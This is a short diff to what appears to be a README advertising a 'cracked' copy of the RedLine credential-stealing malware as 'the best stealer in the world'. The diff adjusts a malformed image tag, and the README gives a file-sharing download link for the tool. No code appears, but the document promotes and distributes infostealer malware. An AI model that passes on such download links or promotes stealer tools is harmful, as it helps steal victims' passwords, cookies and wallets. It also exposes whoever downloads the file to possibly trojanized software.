@@ -1,7 +1,7 @@
 # REDLINE-STEALER-CRACKED
 THE BEST STEALER IN THE WORLD IT'S NOW CRACKED
 
-<img src="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.linkedin.com%2Fpulse%2Fredline-stealer-malware-explained-ashwin-harish-p&psig=AOvVaw1nVyG93Nd6tabu0jdxq60N&ust=1721929813226000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCNC57e-ewIcDFQAAAAAdAAAAABAJ"</img>
+<img src="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.linkedin.com%2Fpulse%2Fredline-stealer-malware-explained-ashwin-harish-p&psig=AOvVaw1nVyG93Nd6tabu0jdxq60N&ust=1721929813226000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCNC57e-ewIcDFQAAAAAdAAAAABAJ>"</img>
 
 DOWNLOAD : https://we.tl/t-PRlgiVaHK8
 
